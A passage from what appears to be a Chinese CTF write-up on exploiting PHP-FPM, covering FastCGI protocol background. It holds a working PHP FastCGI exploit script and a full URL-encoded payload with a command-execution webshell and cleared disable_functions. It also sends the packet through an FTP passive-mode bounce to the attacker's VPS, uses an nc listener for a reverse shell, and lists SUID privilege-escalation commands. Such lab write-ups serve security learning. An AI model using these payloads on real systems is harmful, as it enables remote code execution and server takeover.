data-num="253"></td><td><pre>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">readNvpair</span><span class="token punctuation">(</span><span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$resp</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'length'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="254"></td><td><pre>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="255"></td><td><pre>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Unexpected response type, expecting GET_VALUES_RESULT'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="256"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="257"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="258"></td><td><pre>    <span class="token comment">/**</pre></td></tr><tr><td data-num="259"></td><td><pre>     * Execute a request to the FastCGI application</pre></td></tr><tr><td data-num="260"></td><td><pre>     *</pre></td></tr><tr><td data-num="261"></td><td><pre>     * @param array $params Array of parameters</pre></td></tr><tr><td data-num="262"></td><td><pre>     * @param String $stdin Content</pre></td></tr><tr><td data-num="263"></td><td><pre>     * @return String</pre></td></tr><tr><td data-num="264"></td><td><pre>     */</span></pre></td></tr><tr><td data-num="265"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">request</span><span class="token punctuation">(</span><span class="token keyword type-hint">array</span> <span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="266"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="267"></td><td><pre>        <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="268"></td><td><pre><span class="token comment">//        $this->connect();</span></pre></td></tr><tr><td data-num="269"></td><td><pre>        <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">BEGIN_REQUEST</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">RESPONDER</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_keepAlive</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="270"></td><td><pre>        <span class="token variable">$paramsRequest</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="271"></td><td><pre>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$params</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="272"></td><td><pre>            <span class="token variable">$paramsRequest</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildNvpair</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="273"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="274"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$paramsRequest</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="275"></td><td><pre>            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token variable">$paramsRequest</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="276"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="277"></td><td><pre>        <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">PARAMS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="278"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$stdin</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="279"></td><td><pre>            <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token variable">$stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="280"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="281"></td><td><pre>        <span class="token variable">$request</span> <span class="token operator">.=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">buildPacket</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">STDIN</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="282"></td><td><pre>        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'data='</span><span class="token operator">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="283"></td><td><pre><span class="token comment">//        fwrite($this->_sock, $request);</span></pre></td></tr><tr><td data-num="284"></td><td><pre><span class="token comment">//        do &#123;</span></pre></td></tr><tr><td data-num="285"></td><td><pre><span class="token comment">//            $resp = $this->readPacket();</span></pre></td></tr><tr><td data-num="286"></td><td><pre><span class="token comment">//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) &#123;</span></pre></td></tr><tr><td data-num="287"></td><td><pre><span class="token comment">//                $response .= $resp['content'];</span></pre></td></tr><tr><td data-num="288"></td><td><pre><span class="token comment">//            &#125;</span></pre></td></tr><tr><td data-num="289"></td><td><pre><span class="token comment">//        &#125; while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);</span></pre></td></tr><tr><td data-num="290"></td><td><pre><span class="token comment">//        var_dump($resp);</span></pre></td></tr><tr><td data-num="291"></td><td><pre><span class="token comment">//        if (!is_array($resp)) &#123;</span></pre></td></tr><tr><td data-num="292"></td><td><pre><span class="token comment">//            throw new Exception('Bad request');</span></pre></td></tr><tr><td data-num="293"></td><td><pre><span class="token comment">//        &#125;</span></pre></td></tr><tr><td data-num="294"></td><td><pre><span class="token comment">//        switch (ord($resp['content']&#123;4&#125;)) &#123;</span></pre></td></tr><tr><td data-num="295"></td><td><pre><span class="token comment">//            case self::CANT_MPX_CONN:</span></pre></td></tr><tr><td data-num="296"></td><td><pre><span class="token comment">//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');</span></pre></td></tr><tr><td data-num="297"></td><td><pre><span class="token comment">//                break;</span></pre></td></tr><tr><td data-num="298"></td><td><pre><span class="token comment">//            case self::OVERLOADED:</span></pre></td></tr><tr><td data-num="299"></td><td><pre><span class="token comment">//                throw new Exception('New request rejected; too busy [OVERLOADED]');</span></pre></td></tr><tr><td data-num="300"></td><td><pre><span class="token comment">//                break;</span></pre></td></tr><tr><td data-num="301"></td><td><pre><span class="token comment">//            case self::UNKNOWN_ROLE:</span></pre></td></tr><tr><td data-num="302"></td><td><pre><span class="token comment">//                throw new Exception('Role value not known [UNKNOWN_ROLE]');</span></pre></td></tr><tr><td data-num="303"></td><td><pre><span class="token comment">//                break;</span></pre></td></tr><tr><td data-num="304"></td><td><pre><span class="token comment">//            case self::REQUEST_COMPLETE:</span></pre></td></tr><tr><td data-num="305"></td><td><pre><span class="token comment">//                return $response;</span></pre></td></tr><tr><td data-num="306"></td><td><pre><span class="token comment">//        &#125;</span></pre></td></tr><tr><td data-num="307"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="308"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="309"></td><td><pre><span class="token delimiter important">?></span></span></pre></td></tr><tr><td data-num="310"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></pre></td></tr><tr><td data-num="311"></td><td><pre><span class="token comment">// real exploit start here</span></pre></td></tr><tr><td data-num="312"></td><td><pre><span class="token comment">//if (!isset($_REQUEST['cmd'])) &#123;</span></pre></td></tr><tr><td data-num="313"></td><td><pre><span class="token comment">//    die("Check your input\n");</span></pre></td></tr><tr><td data-num="314"></td><td><pre><span class="token comment">//&#125;</span></pre></td></tr><tr><td data-num="315"></td><td><pre><span class="token comment">//if (!isset($_REQUEST['filepath'])) &#123;</span></pre></td></tr><tr><td data-num="316"></td><td><pre><span class="token comment">//    $filepath = __FILE__;</span></pre></td></tr><tr><td data-num="317"></td><td><pre><span class="token comment">//&#125;else&#123;</span></pre></td></tr><tr><td data-num="318"></td><td><pre><span class="token comment">//    $filepath = $_REQUEST['filepath'];</span></pre></td></tr><tr><td data-num="319"></td><td><pre><span class="token comment">//&#125;</span></pre></td></tr><tr><td data-num="320"></td><td><pre></pre></td></tr><tr><td data-num="321"></td><td><pre><span class="token variable">$filepath</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/html/add_api.php"</span><span class="token punctuation">;</span>    <span class="token comment">// 目标主机已知的 PHP 文件的路径</span></pre></td></tr><tr><td data-num="322"></td><td><pre><span class="token variable">$req</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span><span class="token operator">.</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filepath</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="323"></td><td><pre><span class="token variable">$uri</span> <span class="token operator">=</span> <span class="token variable">$req</span> <span class="token operator">.</span><span class="token string single-quoted-string">'?'</span><span class="token operator">.</span><span class="token string single-quoted-string">'command=whoami'</span><span class="token punctuation">;</span>    <span class="token comment">// 啥也不是，不用管</span></pre></td></tr><tr><td data-num="324"></td><td><pre><span class="token variable">$client</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FCGIClient</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"unix:///var/run/php-fpm.sock"</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="325"></td><td><pre><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?php system(\$_REQUEST['command']); phpinfo(); ?>"</span><span class="token punctuation">;</span>    <span class="token comment">// 啥也不是，不用管</span></pre></td></tr><tr><td data-num="326"></td><td><pre><span class="token variable">$php_value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"unserialize_callback_func = system\nextension_dir = /tmp\nextension = hpdoger.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = "</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="327"></td><td><pre><span class="token variable">$params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="328"></td><td><pre>    <span class="token string single-quoted-string">'GATEWAY_INTERFACE'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'FastCGI/1.0'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="329"></td><td><pre>    <span class="token string single-quoted-string">'REQUEST_METHOD'</span>    <span class="token operator">=></span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="330"></td><td><pre>    <span class="token string single-quoted-string">'SCRIPT_FILENAME'</span>   <span class="token operator">=></span> <span class="token variable">$filepath</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="331"></td><td><pre>    <span class="token string single-quoted-string">'SCRIPT_NAME'</span>       <span class="token operator">=></span> <span class="token variable">$req</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="332"></td><td><pre>    <span class="token string single-quoted-string">'QUERY_STRING'</span>      <span class="token operator">=></span> <span class="token string single-quoted-string">'command=whoami'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="333"></td><td><pre>    <span class="token string single-quoted-string">'REQUEST_URI'</span>       <span class="token operator">=></span> <span class="token variable">$uri</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="334"></td><td><pre>    <span class="token string single-quoted-string">'DOCUMENT_URI'</span>      <span class="token operator">=></span> <span class="token variable">$req</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="335"></td><td><pre><span class="token comment">#'DOCUMENT_ROOT'     => '/',</span></pre></td></tr><tr><td data-num="336"></td><td><pre>    <span class="token string single-quoted-string">'PHP_VALUE'</span>         <span class="token operator">=></span> <span class="token variable">$php_value</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="337"></td><td><pre>    <span class="token string single-quoted-string">'SERVER_SOFTWARE'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">'80sec/wofeiwo'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="338"></td><td><pre>    <span class="token string single-quoted-string">'REMOTE_ADDR'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="339"></td><td><pre>    <span class="token string single-quoted-string">'REMOTE_PORT'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'9001'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="340"></td><td><pre>    <span class="token string single-quoted-string">'SERVER_ADDR'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="341"></td><td><pre>    <span class="token string single-quoted-string">'SERVER_PORT'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'80'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="342"></td><td><pre>    <span class="token string single-quoted-string">'SERVER_NAME'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="343"></td><td><pre>    <span class="token string single-quoted-string">'SERVER_PROTOCOL'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">'HTTP/1.1'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="344"></td><td><pre>    <span class="token string single-quoted-string">'CONTENT_LENGTH'</span>    <span class="token operator">=></span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="345"></td><td><pre><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="346"></td><td><pre><span class="token comment">// print_r($_REQUEST);</span></pre></td></tr><tr><td data-num="347"></td><td><pre><span class="token comment">// print_r($params);</span></pre></td></tr><tr><td data-num="348"></td><td><pre><span class="token comment">//echo "Call: $uri\n\n";</span></pre></td></tr><tr><td data-num="349"></td><td><pre><span class="token keyword">echo</span> <span class="token variable">$client</span><span class="token operator">-></span><span class="token function">request</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="350"></td><td><pre><span class="token delimiter important">?></span></span></pre></td></tr></table></figure><p>网上通用的脚本，用来生成 bin 码</p>
<h4 id="ftp-passive-mode发bin给php-fpm"><a class="anchor" href="#ftp-passive-mode发bin给php-fpm">#</a> FTP Passive Mode 发 bin 给 php-fpm</h4>
<p>可以利用 <code>file_get_contents</code>  配合 <code>ftp://</code>  协议来把恶意 bin 打到 FastCGI 上，这里又牵扯到 FTP 的主动 / 被动模式，我们需要利用 FTP 的被动模式来伪造客户端端口，使得服务端将数据发送到 9001 端口上。<strong>这是因为在 FTP 被动模式下，是由客户端主动向服务端发起请求，并告知服务端需要连接交互的端口，所以这里的端口是客户端可控可伪造的</strong>。因此我们可以在起一个 FTP 的客户端，模拟发送 FTP passive mode 的包，当服务端通过 <code>ftp://&lt;VPS&gt;:&lt;PORT&gt;</code>  和客户端发起交互时，客户端模拟 Passive Mode 请求，其中伪造端口为<strong> 127.0.0.1:9001</strong>，这样服务端就会把恶意 bin 打到 php-fpm 上从而完成 RCE。</p>
<p>先准备一个 ftp.py 来起 ftp 服务器模拟客户端请求，端口绑定到自己的 vps 的 23 端口上</p>
<p>再在 vps 上面起 nc 监听</p>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411072158697.png" alt="image-20241107215835605" /></p>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411072158265.png" alt="image-20241107215850110" /></p>
<p>两个都要起在 add_api.ph 里面发送 ftp 申请</p>
<pre><code>/add_api.php?backdoor=$file = $_GET['file'];$data = $_GET['data'];file_put_contents($file,$data);&amp;file=ftp://aaa@vps:23/123&amp;data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%02%3F%00%00%11%0BGATEWAY_INTERFACEFastCGI%2F1.0%0E%04REQUEST_METHODPOST%0F%19SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Fadd_api.php%0B%0CSCRIPT_NAME%2Fadd_api.php%0C%0EQUERY_STRINGcommand%3Dwhoami%0B%1BREQUEST_URI%2Fadd_api.php%3Fcommand%3Dwhoami%0C%0CDOCUMENT_URI%2Fadd_api.php%09%80%00%00%B3PHP_VALUEunserialize_callback_func+%3D+system%0Aextension_dir+%3D+%2Ftmp%0Aextension+%3D+hpdoger.so%0Adisable_classes+%3D+%0Adisable_functions+%3D+%0Aallow_url_include+%3D+On%0Aopen_basedir+%3D+%2F%0Aauto_prepend_file+%3D+%0F%0DSERVER_SOFTWARE80sec%2Fwofeiwo%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9001%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP%2F1.1%0E%02CONTENT_LENGTH49%01%04%00%01%00%00%00%00%01%05%00%01%001%00%00%3C%3Fphp+system%28%24_REQUEST%5B%27command%27%5D%29%3B+phpinfo%28%29%3B+%3F%3E%01%05%00%01%00%00%00%00
</code></pre>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411072207507.png" alt="image-20241107220741392" /></p>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411072208814.png" alt="image-20241107220800723" /></p>
<p>此时当 ftp 建立连接后，会通过被动模式将 payload 重定向到目标主机本地 9001 端口的 PHP-FPM 上，并成功反弹</p>
<p>后面就是一个 SUID 提权了，利用的是 /usr/local/bin/php，直接进行 PHP 交互模式执行代码获取 flag 即可。</p>
<h4 id="suid提权"><a class="anchor" href="#suid提权">#</a> SUID 提权</h4>
<p><strong>. 查看 SUID 可执行文件的命令</strong></p>
<ul>
<li>
<p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p>
</li>
<li>
<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
</li>
<li>
<p><code>find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</code></p>
<p>以上任意一条均可查看</p>
</li>
</ul>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411072210673.png" alt="image-20241107221037597" /></p>
<p>获取这个东西，发现有这个 php 可以利用（网上好像也没有这个的利用方法），直接、</p>
<p><img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411072211471.png" alt="image-20241107221136272" /></p>
<p>获取 flag（直接运行获取 root 权限访问 flag 文件（只是这一条有 root 权限））</p>
<p>也可以交互模式获取 flag：<br />
<img data-src="https://zty--666.oss-cn-shanghai.aliyuncs.com/202411072219158.png" alt="image-20241107221950934" /></p>
<p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly9mb3J1bS5idXRpYW4ubmV0L3NoYXJlLzQ3NQ==">https://forum.butian.net/share/475</span></p>
<p>参考链接：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmRpZ2dpZC5mdW4vMjAyMS8wNS8wNC8lRTglOTMlOUQlRTUlQjglQkQlRTYlOUQlQUYtMjAyMS1PbmUtUG9pbnRlci1QSFAtJUU1JUE0JThEJUU3JThFJUIwLyMlRTYlOUMlODAlRTUlQTQlQTclRTYlOTUlQjQlRTYlOTUlQjAlRTclQkIlOTUlRTglQkYlODclRTYlOTUlQjAlRTclQkIlODQlRTglQjUlOEIlRTUlODAlQkM=">https://blog.diggid.fun/2021/05/04 / 蓝帽杯 - 2021-One-Pointer-PHP - 复现 /# 最大整数绕过数组赋值</span></p>
<p>参考连接：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnFpdXllLmluay8yMDIyLzA5LzI3L0NURi93ZWIvJUU0JUJCJThFJUU0JUI4JTgwJUU5JTgxJTkzJUU5JUEyJTk4JUU3JTlDJThCZmFzdGNnaSVFNCVCOCU4RXNzcmYvI3dyaXRldXA=">https://blog.qiuye.ink/2022/09/27/CTF/web/ 从一道题看 fastcgi 与 ssrf/#writeup</span></p>
<p>知识点：php-FPM</p>
<h2 id="cgi"><a class="anchor" href="#cgi">#</a> CGI</h2>
<p>早期的 Web 服务器，只能响应浏览器发来的 HTTP 静态资源的请求，并将存储在服务器中的静态资源返回给浏览器。随着 Web 技术的发展，逐渐出现了动态技术，但是 Web 服务器并不能够直接运行动态脚本，为了解决 Web 服务器与外部应用程序（CGI 程序）之间数据互通，于是出现了 CGI（Common Gateway Interface）通用网关接口。<strong>简单理解，可以认为 CGI 是 Web 服务器和运行在其上的应用程序进行 “交流” 的一种约定。</strong></p>
<p>当遇到动态脚本请求时，Web 服务器主进程就会 Fork 创建出一个新的进程来启动 CGI 程序，运行外部 C 程序或 Perl、PHP 脚本等，也就是将动态脚本交给 CGI 程序来处理。启动 CGI 程序需要一个过程，如读取配置文件、加载扩展等。当 CGI 程序启动后会去解析动态脚本，然后将结果返回给 Web 服务器，最后由 Web 服务器将结果返回给客户端，之前 Fork 出来的进程也随之关闭。这样，每次用户请求动态脚本，Web 服务器都要重新 Fork 创建一个新进程去启动 CGI 程序，由 CGI 程序来处理动态脚本，处理完成后进程随之关闭，其效率是非常低下的。</p>
<p>而对于 Mod CGI，Web 服务器可以内置 Perl 解释器或 PHP 解释器。 也就是说将这些解释器做成模块的方式，Web 服务器会在启动的时候就启动这些解释器。 当有新的动态请求进来时，Web 服务器就是自己解析这些动态脚本，省得重新 Fork 一个进程，效率提高了。</p>
<h2 id="fastcgi"><a class="anchor" href="#fastcgi">#</a> FastCGI</h2>
<p>有了 CGI，自然就解决了 Web 服务器与 PHP 解释器的通信问题，但是 Web 服务器有一个问题，就是它每收到一个请求，都会去 Fork 一个 CGI 进程，请求结束再 kill 掉这个进程，这样会很浪费资源。于是，便出现了 CGI 的改良版本 ——Fast-CGI。</p>
<p>维基百科对 FastCGI 的解释是：快速通用网关接口（Fast Common Gateway Interface／FastCGI）是一种让交互程序与 Web 服务器通信的协议。FastCGI 是早期通用网关接口（CGI）的增强版本。FastCGI 致力于减少网页服务器与 CGI 程序之间交互的开销，Fast-CGI 每次处理完请求后，不会 kill 掉这个进程，而是保留这个进程，从而使服务器可以同时处理更多的网页请求。这样就会大大的提高效率。</p>
<h2 id="浏览器处理静态动态网页过程"><a class="anchor" href="#浏览器处理静态动态网页过程">#</a> 浏览器处理静态 / 动态网页过程</h2>
<p>众所周知，在网站分类中存在一种分类就是静态网站和动态网站，两者的区别就是静态网站只需要通过浏览器进行解析，其中的页面是一对一的（一个内容对应一个页面），而动态网站需要一个额外的编译解析的过程，网页上的数据是从数据库中或者其他地方调用，页面会随着数据的变化而改变，就产生了一定的交互性。</p>
<h3 id="浏览器访问静态网页过程"><a class="anchor" href="#浏览器访问静态网页过程">#</a> 浏览器访问静态网页过程</h3>
<p>在整个网页的访问过程中，Web 容器（例如 Apache、Nginx）只担任着<strong>内容分发</strong>者的身份，当访问静态网站的主页时，Web 容器会到网站的相应目录中查找主页文件，然后发送给用户的浏览器。</p>
<p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c7f0903349d096dcfd2a6c1a6808138ed0365330.jpg" alt="img" /></p>
<h3 id="浏览器访问动态网页过程"><a class="anchor" href="#浏览器访问动态网页过程">#</a> 浏览器访问动态网页过程</h3>
<p>当访问动态网站的主页时，根据容器的配置文件，它知道这个页面不是静态页面，Web 容器就会去找 PHP 解析器来进行处理（这里以 Apache 为例），它会把这个请求进行简单的处理，然后交给 PHP 解释器。</p>
<p><img data-src="https://shs3.b.qianxin.com/attack_forum/2021/12/attach-776b13e7275277095916608bf6b76aa56d42a881.jpg" alt="img" /></p>
<p>当 Apache 收到用户对 index.php 的请求后，如果使用的是 CGI，会启动对应的 CGI 程序，对应在这里就是 PHP 的解析器。接下来 PHP 解析器会解析 php.ini 文件，初始化执行环境，然后处理请求，再以 CGI 规定的格式返回处理后的结果，退出进程，Web Server 再把结果返回给浏览器。这就是一个完整的动态 PHP Web 访问流程。</p>
<p>这里说的是使用 CGI，而 FastCGI 就相当于高性能的 CGI，与 CGI 不同的是它像一个常驻的 CGI，在启动后会一直运行着，不需要每次处理数据时都启动一次， 所以这里引出下面这句概念，FastCGI 是语言无关的、可伸缩架构的 CGI 开放扩展，<strong>其主要行为是将 CGI 解释器进程保持在内存中</strong>，并因此获得较高的性能 。</p>
<h2 id="fastcgi-协议分析"><a class="anchor" href="#fastcgi-协议分析">#</a> Fastcgi 协议分析</h2>
<h3 id="fastcgi-record"><a class="anchor" href="#fastcgi-record">#</a> Fastcgi Record</h3>
<p>Fastcgi 其实是一个通信协议，和 HTTP 协议一样，都是进行数据交换的一个通道。</p>
<p>HTTP 协议是 <strong>浏览器和服务器中间件</strong> 进行数据交换的协议，浏览器将 HTTP 头和 HTTP 体用某个规则组装成数据包，以 TCP 的方式发送到服务器中间件，服务器中间件按照规则将数据包解码，并按要求拿到用户需要的数据，再以 HTTP 协议的规则打包返回给服务器。</p>
<p>类比 HTTP 协议来说，Fastcgi 协议则是 <strong>服务器中间件和某个语言后端</strong> 进行数据交换的协议。Fastcgi 协议由多个 Record 组成，Record 也有 Header 和 Body 一说，服务器中间件将这二者按照 Fastcgi 的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照 Fastcgi 协议封装好后返回给服务器中间件。</p>
<p>和 HTTP 头不同，Fastcgi Record 的头固定 8 个字节，Body 是由头中的  <code>contentLength</code>  指定，其结构如下：</p>
<figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token comment">/* Header 消息头信息 */</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> version<span class="token punctuation">;</span> <span class="token comment">// 用于表示 FastCGI 协议版本号</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> type<span class="token punctuation">;</span> <span class="token comment">// 用于标识 FastCGI 消息的类型，即用于指定处理这个消息的方法</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> requestIdB1<span class="token punctuation">;</span> <span class="token comment">// 用 ID 值标识出当前所属的 FastCGI 请求</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> requestIdB0<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> contentLengthB1<span class="token punctuation">;</span> <span class="token comment">// 数据包包体 Body 所占字节数</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> contentLengthB0<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> paddingLength<span class="token punctuation">;</span> <span class="token comment">// 额外块大小</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> reserved<span class="token punctuation">;</span> 